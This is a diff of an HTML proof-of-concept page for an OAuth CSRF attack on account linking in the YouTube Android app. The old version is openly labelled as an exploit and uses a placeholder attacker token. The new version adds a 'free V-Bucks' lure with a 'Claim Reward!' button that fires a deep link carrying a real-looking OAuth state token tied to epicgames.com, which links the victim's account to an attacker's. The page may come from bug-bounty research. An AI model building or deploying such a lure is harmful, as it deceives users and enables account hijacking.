@@ -1,24 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>YouTube Exploit</title>
-</head>
 <body>
-    <h1>Bug 1: OAuth CSRF PoC</h1>
-    <p>Step 1: Open YouTube -> Settings -> Connected Apps -> Click a partner to link.</p>
-    <p>Step 2: Leave it in the background and come back to this browser.</p>
-    <p>Step 3: Click the button below.</p>
-    
-    <!-- This URI matches the intent-filter in AndroidManifest and hits onNewIntent() -->
-    <a href="vnd.youtube.gdi://?redirect_state=ATTACKER_INJECTED_OAUTH_TOKEN">
-        <button style="padding: 20px; font-size: 20px;">Exploit Account Linking</button>
+    <h2>Click here for free V-Bucks!</h2>
+    <!-- Paste the URL you intercepted here -->
+    <a href="com.google.android.apps.youtube://oauth2redirect?redirect_state=AOtJLdGfYC8lHCNipdBqW378IHSCOAASXWQHzG8_l8ejrw9trlPeiXBi7O3S-InEuB67xt0ixA2YF8iqoGBJWuK-Dadie021aCpbVsxl1qISoMcPDQ_77gbQa0nAf6-Z3JFlr3VQXszZLmSiU63uah1ExU7N6y-hqJkynO7JLFzKAmTqlg5-6m38LxFaYRjYB_FRsbcUt_6xjV6IA6NH6S0NOZrLYPdNCwq2-CJnkiRAKDt1dNHvq7KqnfxGeXigaH08ZQmGmbKpsKiOp5HyDMNYtSLvM2zdIsDALHwDnJi1O-5oTvsMfcBUZS4-ImnvXS3cRj3nasS9d7g-BkO06WNqWcRG_t5HKN3s72_B3kVhTkb8cS6GwCgFGbV0AcDEia9NrVMO9f9sMLhiSgUNqAUhnWkoVXeQAV6CahjDTpAijjzsdWIeSwK0-XKs83Vo9GsWqqJ_3CbIoUjzlUjWiNlJ3hCsbd9LG1hh-MQyuDh8Mq4GZsYQv8439-k8nRdA4wRP_OWm2JvZ8fBrhqqOa5-XvBxqDSnU5Ck7E-RR619pKxbUTbn3-IDs9YpABU8G-8GtVhq8rsvKYlpb_N1LFdE-WpLmrIrF5s-SiWt-0dhzycT8bb0wX8bPRdst6zcio0vKl49jIriZ0-5XDb5Z&state=AOtJLdGTBleDvl0z3wR7GAKVa1Lagh5zgIbGEshtFFTl07KHCJEFeuHLX32_EWxfqkaSnU3Ixo_Fz2kqZAnuznH5Idtppjp_MqqkeaW7QQB2B7-XoqRMT6H_qyMdzMOu0DsUbbXmcME2qsmRkrO1iw2AruqrmpC4d5cvMtNU1zSQY3VnTT4myUpsSBV-sageEPXdNzhyEP24eOdWpWzkakLySIWA9_l67iMvIdwQ9pQNrxksOX9JGJTyipZ_ogKqUWCOr8Fa0A5Lpliy9WJ7dw1fytmeW9OHdlsS5P7YZ8pRZV-08EhnCmdHB_JkkCdlKO5xzTqwzRcplnunOCyyL96C1tJWXIcM5GbU9WNUMYAjcLGwPYBr8xEmzYQMUIQNRA59dpuZoGzHFaiyK3FJCirVdtaMTEF4U-1CkKjvlQ5juuXd_9Ttq9-KMB9IkqFssFINUUhwPUa1oq0MmHt_mdHExZxQI0_tmEoWd_DV2O6aHSVhyMQnO6vYNwNQNJ5IDUmW_pupq2P5uMb8HSRyIYA_EzOiFiqqvf4eKLef7bjEo1KPqPBdlU_eIoSkRZ5K3L7nusc&service=epicgames.com">
+       <button style="padding:50px; font-size:40px;">Claim Reward!</button>
     </a>
-
-    <!-- Optional: Auto-trigger via JavaScript -->
-    <script>
-        // setTimeout(function() {
-        //    window.location.href = "vnd.youtube.gdi://?redirect_state=ATTACKER_INJECTED_OAUTH_TOKEN";
-        // }, 2000);
-    </script>
 </body>
 </html>
